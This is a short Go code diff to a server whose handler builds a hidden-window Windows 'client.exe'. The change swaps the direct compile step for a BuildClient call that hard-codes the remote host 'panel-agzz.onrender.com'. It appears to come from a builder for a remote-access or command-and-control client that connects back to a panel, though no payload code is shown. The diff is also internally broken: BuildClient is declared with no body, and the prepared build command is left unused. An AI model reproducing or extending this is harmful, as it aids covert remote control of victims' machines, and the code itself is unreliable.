@@ -19,6 +19,8 @@ import (
 	"github.com/gorilla/websocket"
 )
 
+func BuildClient(serverHost string) error
+
 type Message struct {
 	Type string `json:"type"`
 	Data string `json:"data"`
@@ -117,8 +119,8 @@ func createBuildHandler(w http.ResponseWriter, r *http.Request) {
 	cmd := exec.Command("go", "build", "-ldflags", "-H=windowsgui", "-o", "client.exe", "client.go")
 	cmd.Dir = tmpDir
 	cmd.Env = append(os.Environ(), "CGO_ENABLED=1", "GOOS=windows", "GOARCH=amd64")
-	if err := cmd.Run(); err != nil {
-		http.Error(w, "build failed", http.StatusInternalServerError)
+	if err := BuildClient("panel-agzz.onrender.com"); err != nil {
+		http.Error(w, "build failed: "+err.Error(), http.StatusInternalServerError)
 		return
 	}
 
